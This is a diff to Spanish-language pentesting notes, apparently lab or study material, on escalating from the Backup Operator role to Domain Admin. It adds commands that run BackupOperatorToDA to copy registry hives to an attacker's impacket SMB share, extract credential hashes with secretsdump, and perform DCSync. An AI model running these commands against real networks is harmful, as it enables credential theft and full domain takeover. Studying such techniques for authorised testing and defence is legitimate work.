@@ -20,3 +20,10 @@
 - Entonces con secretsdump podes obtener las credenciales de los usuarios
     - `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL`
     - Y con esto es muy probable que nos de un hash con un usuario que nos deje hacer un DCSync.
+
+### Metodo 2 con BackUpOperatorToDA
+- [Sitio oficial de la herramienta](https://kb.offsec.nl/tools/techniques/backupoperatortoda/)
+- Nos descargamos el .exe y lo ponemos en la maquina que tiene el rol de backup operator.
+- Tiras con impacket: `impacket-smbserver -smb2support "share" .`
+- Y desde la otra PC: `.\BackupOperatorToDA_release.exe -t \\IP-DE-TU-MAQUINA\share -u melissa -p LA-PASSWORD -d DOMAIN.LOCAL`
+- Luego es lo mismo, secretsdump + dcsync.
